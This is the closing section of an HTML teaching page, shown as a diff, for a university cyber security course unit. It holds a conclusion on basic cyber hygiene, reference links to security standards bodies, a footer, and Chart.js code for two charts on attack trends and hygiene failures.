+    <p>Cybercrime techniques — from digital footprint exploitation and social engineering to APTs and dark web marketplaces — form a sophisticated, evolving ecosystem. Yet the FinTechCo case study demonstrates that the most advanced attack chains still rely on the most basic hygiene failures: unpatched systems, default passwords, untrained employees, and inadequate backups. Technology and knowledge of attack techniques matter — but the greatest impact on cybersecurity comes from disciplined, consistent practice of fundamental cyber hygiene. Every topic in this unit ultimately points to the same conclusion: attackers exploit what defenders neglect.</p>
+  </div>
+
+  <div class="ref-box">
+    <div class="ref-label">References</div>
+    <ul>
+      <li>CERT-IN Guidelines for Organisations: https://www.cert-in.org.in/PDF/CERT-In_Guidelines.pdf</li>
+      <li>NCSC Cyber Essentials (UK): https://www.ncsc.gov.uk/cyberessentials — baseline hygiene standard</li>
+      <li>CIS Controls v8 — 18 Cyber Hygiene Controls: https://www.cisecurity.org/controls</li>
+      <li>RBI Cyber Security Framework for Banks: https://www.rbi.org.in — applicable to all BFSI sector</li>
+      <li>MHA I4C National Cybercrime Reporting Portal: https://cybercrime.gov.in · Helpline: <strong>1930</strong></li>
+    </ul>
+  </div>
+</section>
+
+</main><!-- end .content-wrap -->
+
+<!-- ════════════ FOOTER ════════════ -->
+<footer class="page-footer">
+  <div class="footer-inner">
+    <span>Introduction to Cyber Security · Unit 02 · 2024 Pattern</span>
+    <div class="footer-links">
+      <a href="unit01_sem01_ics.html">← Unit 1</a>
+      <a href="ICS_Index.html">🏠 Home</a>
+      <a href="#">Unit 3 →</a>
+    </div>
+    <span>F.Y. M.C.A. (Management) · SPPU · Design &amp; Developed by Sumit Thakare</span>
+  </div>
+</footer>
+
+<button class="back-top" onclick="window.scrollTo({top:0,behavior:'smooth'})" title="Back to top">↑</button>
+
+<!-- ════════════ SCRIPTS ════════════ -->
+<script>
+document.querySelectorAll('.nav-links a').forEach(a =>
+  a.addEventListener('click', () => document.querySelector('.nav-links').classList.remove('open'))
+);
+window.addEventListener('scroll', () => {
+  document.querySelector('.back-top').classList.toggle('visible', window.scrollY > 400);
+});
+
+Chart.defaults.font.family = "'Source Serif 4', Georgia, serif";
+Chart.defaults.color = '#3a3a36';
+
+// Chart 1 — AI Attack Sophistication vs Defender Detection
+const ctx1 = document.getElementById('aiChart');
+new Chart(ctx1, {
+  type: 'line',
+  data: {
+    labels: ['2015', '2016', '2017', '2018', '2019', '2020', '2021', '2022', '2023', '2024'],
+    datasets: [
+      {
+        label: 'AI-Enabled Attack Sophistication',
+        data: [1, 2, 2, 3, 4, 5, 6, 7.5, 9, 10],
+        borderColor: '#c0392b', backgroundColor: 'rgba(192,57,43,0.08)',
+        borderWidth: 2.5, pointRadius: 5, tension: 0.4, fill: true
+      },
+      {
+        label: 'Traditional Defender Detection Capability',
+        data: [4, 4.5, 5, 5.5, 6, 6, 6.5, 7, 7, 7.5],
+        borderColor: '#0c8da0', backgroundColor: 'rgba(12,141,160,0.08)',
+        borderWidth: 2.5, pointRadius: 5, tension: 0.4, fill: true
+      },
+      {
+        label: 'AI-Augmented Defense Capability',
+        data: [null, null, null, null, null, 5.5, 6.5, 7.5, 8.5, 9],
+        borderColor: '#1a7a34', backgroundColor: 'rgba(26,122,52,0.08)',
+        borderWidth: 2.5, pointRadius: 5, tension: 0.4, fill: true, borderDash: [6,3]
+      }
+    ]
+  },
+  options: {
+    responsive: true,
+    scales: {
+      y: { beginAtZero: true, max: 11, title: { display: true, text: 'Relative Capability (1–10)' }, grid: { color: '#eee' } },
+      x: { grid: { display: false } }
+    },
+    plugins: { legend: { position: 'bottom' } }
+  }
+});
+
+// Chart 2 — Cyber Hygiene Failures in Indian SMEs
+const ctx2 = document.getElementById('hygieneChart');
+new Chart(ctx2, {
+  type: 'bar',
+  data: {
+    labels: ['Unpatched\nSystems', 'Weak/Default\nPasswords', 'No MFA', 'Phishing\nSusceptibility', 'Inadequate\nBackups', 'No Security\nTraining', 'Default\nConfigs'],
+    datasets: [{
+      label: '% of SME Breaches Involving This Failure',
+      data: [68, 74, 81, 88, 62, 79, 55],
+      backgroundColor: [
+        'rgba(192,57,43,0.75)', 'rgba(111,66,193,0.75)', 'rgba(12,141,160,0.75)',
+        'rgba(230,172,0,0.80)', 'rgba(26,122,52,0.75)', 'rgba(58,58,54,0.75)', 'rgba(230,126,34,0.75)'
+      ],
+      borderColor: ['#c0392b','#6f42c1','#0c8da0','#e6ac00','#1a7a34','#3a3a36','#e67e22'],
+      borderWidth: 2, borderRadius: 3
+    }]
+  },
+  options: {
+    responsive: true,
+    plugins: { legend: { display: false } },
+    scales: {
+      y: {
+        beginAtZero: true, max: 100,
+        title: { display: true, text: '% of Breaches (CERT-IN / IBM India 2023)' },
+        grid: { color: '#eee' }
+      },
+      x: { grid: { display: false }, ticks: { font: { size: 9 } } }
+    }
+  }
+});
+</script>
+</body>
+</html>
